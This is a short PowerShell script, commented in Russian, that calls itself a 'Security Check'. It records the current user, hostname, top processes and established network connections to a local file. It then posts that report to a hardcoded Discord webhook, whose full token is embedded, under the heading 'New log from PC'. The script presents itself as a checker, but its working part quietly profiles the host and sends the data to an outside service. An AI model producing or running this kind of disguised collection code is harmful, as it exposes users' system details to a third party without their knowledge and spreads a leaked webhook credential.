# === Checker.ps1 ===
$dumpPath = "C:\Temp\Dump"
$logFile = "$dumpPath\report.txt"
$webhookUrl = "https://discord.com/api/webhooks/1400518810921996318/GPMDV5fgPB6s7W2ZYU03q0DxO4zWx5dYKrgnYOg7JomlpuSwIfn9T9IwrlpPzXto6BfZ"

# Создание папки и файла
New-Item -Path $dumpPath -ItemType Directory -Force | Out-Null
"🕵️‍♂️ Security Check — $(Get-Date)" | Out-File $logFile
"User: $(whoami)" | Out-File $logFile -Append
"Hostname: $env:COMPUTERNAME" | Out-File $logFile -Append

"`n--- Top Processes by CPU ---" | Out-File $logFile -Append
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 |
Format-Table -AutoSize | Out-String | Out-File $logFile -Append

"`n--- Active Connections ---" | Out-File $logFile -Append
netstat -ano | Select-String "ESTABLISHED" | Out-File $logFile -Append

# === Отправка в Discord ===
# Чтение файла в base64 (если текст очень длинный)
$logText = Get-Content -Path $logFile -Raw

$payload = @{
    content = "🧾 Новый лог с ПК `$(whoami)`"
    embeds = @(@{
        title = "Security Log"
        description = "```$logText```"
        color = 5814783
        footer = @{ text = "Checker by Марс" }
        timestamp = (Get-Date).ToString("o")
    })
}

# Преобразуем в JSON и отправляем
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json -Depth 4) -ContentType 'application/json'
